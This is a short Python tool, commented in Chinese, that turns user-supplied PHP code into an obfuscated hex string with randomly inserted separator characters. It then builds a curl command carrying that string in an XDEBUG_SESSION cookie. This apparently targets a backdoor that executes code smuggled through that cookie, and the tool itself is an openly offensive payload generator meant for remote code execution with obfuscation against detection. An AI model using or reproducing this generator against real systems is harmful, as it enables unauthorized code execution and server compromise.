import random


def php_code_to_hex(php_code):
    """将 PHP 代码转换为十六进制字符串"""
    return php_code.encode().hex()


def insert_separator(hex_string, separator="!@#"):
    """在十六进制字符串中随机插入分隔符"""
    result = ""
    length = len(hex_string)
    index = 0
    while index < length:
        if index > 0 and random.random() < 0.3:
            result += random.choice(separator)
        result += hex_string[index]
        index += 1
    return result


def generate_curl_command(encoded_string):
    """生成 curl 命令"""
    return f'curl -b "XDEBUG_SESSION={encoded_string}"'


if __name__ == "__main__":
    # 交互式输入 PHP 代码
    php_code = input("请输入要编码的 PHP 代码（按回车确认）: ").strip()

    # 核心处理流程
    hex_code = php_code_to_hex(php_code)
    encoded_code = insert_separator(hex_code)
    curl_command = generate_curl_command(encoded_code)
    # 输出结果
    print("\n" + "=" * 40)
    print("[+] 原始代码的十六进制:\n", hex_code)
    print("\n[+] 混淆后的字符串:\n", encoded_code)
    print("\n[+] 生成的 curl 命令:\n", curl_command)
    print("=" * 40)